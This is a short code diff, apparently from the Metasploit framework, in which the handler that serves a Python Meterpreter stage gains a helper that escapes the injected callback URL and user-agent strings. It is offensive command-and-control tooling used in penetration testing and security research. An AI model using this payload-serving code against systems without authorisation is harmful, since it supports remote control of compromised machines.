@@ -201,11 +201,15 @@ protected
         blob = ""
         blob << obj.generate_stage
 
+        var_escape = lambda { |txt|
+          txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
+        }
+
         # Patch all the things
-        blob = blob.sub("HTTP_CONNECTION_URL = None", "HTTP_CONNECTION_URL = '#{url}'")
-        blob = blob.sub("HTTP_EXPIRATION_TIMEOUT = 604800", "HTTP_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
-        blob = blob.sub("HTTP_COMMUNICATION_TIMEOUT = 300", "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
-        blob = blob.sub("HTTP_USER_AGENT = None", "HTTP_USER_AGENT = '#{datastore['MeterpreterUserAgent']}'")
+        blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
+        blob.sub!('HTTP_EXPIRATION_TIMEOUT = 604800', "HTTP_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
+        blob.sub!('HTTP_COMMUNICATION_TIMEOUT = 300', "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
+        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
 
         resp.body = blob
 
